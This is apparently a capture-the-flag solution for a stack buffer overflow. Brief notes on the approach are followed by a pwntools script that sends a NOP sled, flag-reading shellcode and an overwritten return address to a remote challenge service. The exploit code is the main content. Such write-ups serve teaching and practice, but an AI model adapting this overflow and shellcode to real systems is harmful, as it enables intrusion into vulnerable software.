* make a bufferoverflow to overwrite the ret addr to the random addr within stack which can **be writable**
* put shellcode in the rdn addr in the stack, since its random, need **nop sled** to reach the shellcode
* so payload = nopsled_padding + shellcode + padding_rbp + ret_address

```
from pwn import *
import struct


def interact_with_process(binary_path, host=None, port=None):
    # Start the process
    if host and port:
        p = remote(host, port)
    else:
        p = process(binary_path)

    context.arch = 'amd64'


    shellcode = asm('''
           XOR RAX, RAX
           MOV RAX, 0x47414C462F
           PUSH RAX
           MOV RDI, RSP


           XOR RSI, RSI
           XOR RDX, RDX
           MOV RAX, 2
           SYSCALL

           MOV RDI, RAX
           MOV RSI, RSP
           MOV RDX, 200
           XOR RAX, RAX
           SYSCALL

           MOV RDI, 1
           MOV RSI, RSP
           MOV RDX, 200
           MOV RAX, 1
           SYSCALL

           XOR RDI, RDI
           MOV RAX, 60
           SYSCALL

       ''')

    padding_size = (0x2000 - len(shellcode))

    padding = b"\x90" * padding_size

    padding_rbp = b"A" * 8
    # print('padding_size is :', padding_size)

    # print("Shellcode: ", shellcode.hex())

    p.recvuntil(b'Here is a random stack address: ')
    rdn_addr_str = p.recvline().strip(b'\n')
    rdn_addr = int(rdn_addr_str, 16)
    ret_address = p64(rdn_addr)
    # print(f"Random stack address: {ret_address}")

    payload = padding + shellcode + padding_rbp + ret_address
    # print('payload:', payload)

    # Send the payload
    p.sendline(payload)
    p.interactive()


# Example usage
interact_with_process('', 'lol', 22301)

```
